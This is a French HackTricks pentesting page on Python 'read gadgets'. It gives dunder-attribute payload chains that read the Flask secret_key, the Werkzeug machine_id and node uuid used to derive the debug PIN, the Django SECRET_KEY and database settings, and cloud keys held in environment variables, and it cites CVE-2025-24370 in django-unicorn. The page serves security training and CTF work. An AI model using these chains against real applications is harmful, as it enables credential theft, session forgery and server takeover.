# Gadgets de lecture internes pour Python

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Différentes vulnérabilités telles que [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ou [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) peuvent vous permettre de **lire des données internes de Python mais n'autoriseront pas l'exécution de code**. Par conséquent, un pentester devra tirer le meilleur parti de ces permissions de lecture pour **obtenir des privilèges sensibles et escalader la vulnérabilité**.

### Flask - Lire la clé secrète

La page principale d'une application Flask aura probablement l'objet global **`app`** où cette **clé secrète est configurée**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Dans ce cas, il est possible d'accéder à cet objet simplement en utilisant n'importe quel gadget pour **accéder aux objets globaux** depuis la [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

Dans le cas où **la vulnérabilité se trouve dans un autre fichier python**, vous avez besoin d'un gadget pour parcourir les fichiers et atteindre le fichier principal afin de **accéder à l'objet global `app.secret_key`** pour changer la clé secrète Flask et pouvoir [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload comme celui-ci [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Utilisez ce payload pour **modifier `app.secret_key`** (le nom dans votre app peut être différent) afin de pouvoir signer de nouveaux flask cookies avec plus de privilèges.

### Werkzeug - machine_id et node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) vous permettra d'accéder au **machine_id** et au **node uuid**, qui sont les **principaux secrets** dont vous avez besoin pour [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) que vous pouvez utiliser pour accéder à la python console dans `/console` si le **debug mode** est activé :
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Notez que vous pouvez obtenir le **chemin local du serveur vers le `app.py`** en générant une **erreur** dans la page web, ce qui vous **donnera le chemin**.

Si la vulnérabilité se trouve dans un autre fichier python, consultez l'astuce Flask précédente pour accéder aux objets depuis le fichier python principal.

### Django - SECRET_KEY et le module settings

L'objet settings de Django est mis en cache dans `sys.modules` une fois l'application démarrée. Avec uniquement des primitives en lecture seule, vous pouvez leak la **`SECRET_KEY`**, les identifiants de la base de données ou les salts de signature:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
Si le gadget vulnérable se trouve dans un autre module, parcourez d'abord globals :
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
Une fois la clé connue, vous pouvez forger des Django signed cookies ou tokens de la même façon que pour Flask.

### Variables d'environnement / identifiants cloud via modules chargés

Beaucoup de jails importent encore `os` ou `sys` quelque part. Vous pouvez abuser de n'importe quelle fonction accessible via `__init__.__globals__` pour pivoter vers le module `os` déjà importé et extraire les **variables d'environnement** contenant des API tokens, cloud keys ou flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Si l'index des sous-classes est filtré, utilisez loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Les variables d'environnement sont fréquemment les seuls secrets nécessaires pour passer d'un accès en lecture à une compromission complète (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn pollution de classes (CVE-2025-24370)

`django-unicorn` (<0.62.0) permettait une **pollution de classes** via des requêtes de composants spécialement construites. Définir un chemin de propriété tel que `__init__.__globals__` permettait à un attaquant d'atteindre les globals du module du composant et tout module importé (p.ex. `settings`, `os`, `sys`). De là, vous pouvez leak `SECRET_KEY`, `DATABASES` ou des identifiants de service sans exécution de code. La chaîne d'exploitation est purement basée sur la lecture et utilise les mêmes patterns dunder-gadget que ci-dessus.

### Collections de gadgets pour l'enchaînement

Les CTFs récents (p.ex. jailCTF 2025) montrent des chaînes de lecture fiables construites uniquement avec l'accès aux attributs et l'énumération des sous-classes. Des listes maintenues par la communauté telles que [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) répertorient des centaines de gadgets minimaux que vous pouvez combiner pour traverser des objets jusqu'à `__globals__`, `sys.modules` et enfin des données sensibles. Utilisez-les pour vous adapter rapidement lorsque les indices ou les noms de classes diffèrent entre les versions mineures de Python.



## References

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
